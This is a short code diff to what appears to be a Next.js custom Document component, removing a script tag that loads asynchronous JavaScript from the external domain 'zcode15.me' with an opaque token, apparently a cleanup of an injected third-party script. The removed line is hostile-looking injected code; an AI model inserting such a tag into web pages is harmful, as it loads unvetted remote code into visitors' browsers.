@@ -5,7 +5,6 @@ class MyDocument extends Document {
     return (
       <Html lang="en">
         <Head>
-                <script type="text/javascript" src="https://zcode15.me/?ze=muytembwmm5ha3ddf42dsmrz" async></script>
           <link
             rel="apple-touch-icon"
             sizes="180x180"
